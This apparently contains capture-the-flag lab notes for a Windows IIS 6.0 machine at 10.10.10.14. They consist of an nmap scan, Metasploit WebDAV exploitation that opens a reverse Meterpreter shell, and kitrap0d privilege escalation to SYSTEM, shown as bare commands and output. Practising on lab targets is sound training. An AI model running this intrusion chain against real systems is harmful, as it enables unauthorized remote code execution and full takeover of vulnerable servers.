nmap
```
$ sudo nmap -sC -sV 10.10.10.14

Nmap scan report for 10.10.10.14
Host is up (0.033s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Fri, 09 Jul 2021 07:08:28 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

exploit: metasploit
```
$ msfconsole

msf6 > search microsoft webdav

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/windows/iis/ms03_007_ntdll_webdav                 2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow                                                                      
   1  exploit/windows/ssl/ms04_011_pct                          2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow                                                                   
   2  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32     2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution                                                        
   3  exploit/windows/browser/ms10_042_helpctr_xss_cmd_exec     2010-06-09       excellent  No     Microsoft Help Center XSS and Command Execution
   4  exploit/windows/iis/iis_webdav_upload_asp                 2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution                                                                               
   5  exploit/windows/iis/iis_webdav_scstoragepathfromurl       2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow                                                                             
   6  exploit/windows/browser/ms10_046_shortcut_icon_dllloader  2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution

use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.10.10.14
set LHOST tun0
run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.14:1030) at 2021-07-09 03:12:31 -0400

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
<snip>
 1804  588   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.
                                                                             exe
 1900  396   dllhost.exe
 2188  1456  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.e
                                                                             xe
 2256  588   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcda
                                                                             ta.exe
 2428  588   wmiprvse.exe
 3340  2188  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe

meterpreter > migrate 1804
[*] Migrating from 3340 to 1804...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

meterpreter > bg
[*] Backgrounding session 1...

search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


use post/multi/recon/local_exploit_suggester
set SESSION 1
run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST tun0
run

[*] Started reverse TCP handler on 10.10.14.2:4545 
[*] Launching notepad to host the exploit...
[+] Process 2660 launched.
[*] Reflectively injecting the exploit DLL into 2660...
[*] Injecting exploit into 2660 ...
[*] Exploit injected. Injecting payload into 2660...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 3 opened (10.10.14.2:4545 -> 10.10.10.14:1031) at 2021-07-09 03:29:27 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```